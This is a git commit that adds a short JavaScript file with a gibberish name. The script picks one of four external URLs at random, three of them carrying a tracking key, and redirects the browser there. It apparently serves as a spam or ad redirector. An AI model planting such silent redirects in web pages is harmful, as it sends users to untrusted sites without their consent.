2d4b4410780e80539e72dc236647e38665b915fa
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-02-28 12:18:18 +0700

    Create akeadstminggugbngdr.js

---
+++ akeadstminggugbngdr.js
@@ -0,0 +1,10 @@
+var dataUrl = [
+
+'https://cratestable.com/syp0z5brj?key=8f30758f2316816fbcca72577c0b0790',
+'https://soyconfer.com/syp0z5brj?key=8f30758f2316816fbcca72577c0b0790',
+'https://soyconfer.com/syp0z5brj?key=8f30758f2316816fbcca72577c0b0790',
+'https://chatmylinkk.pages.dev'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
